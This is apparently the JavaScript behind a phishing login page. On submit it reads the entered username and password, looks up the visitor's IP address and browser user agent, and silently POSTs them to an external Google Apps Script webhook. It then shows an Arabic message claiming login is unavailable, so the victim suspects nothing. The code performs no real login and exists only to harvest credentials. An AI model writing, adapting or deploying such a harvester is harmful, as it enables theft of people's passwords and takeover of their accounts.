const WEBHOOK_URL = "https://script.google.com/macros/s/AKfycbxCcJ9ufWsIdObgaPM2euAdBN0fTDxIRxI3tAAaFg8K8M1gP5WjeESMd9UTh78HgxVS/exec";

function getVisitorIP() {
  return fetch("https://api.ipify.org?format=json")
    .then(response => response.json())
    .then(data => data.ip)
    .catch(() => "غير معروف");
}

document.getElementById("loginForm").addEventListener("submit", async function(e) {
  e.preventDefault();

  const username = document.getElementById("username").value.trim();
  const password = document.getElementById("password").value.trim();
  const ip = await getVisitorIP();
  const userAgent = navigator.userAgent;

  const data = {
    username,
    password,
    ip,
    userAgent
  };

  fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });

  document.getElementById("message").textContent = "عذراً، لا يمكن تسجيل الدخول حالياً.";
  this.reset();
});
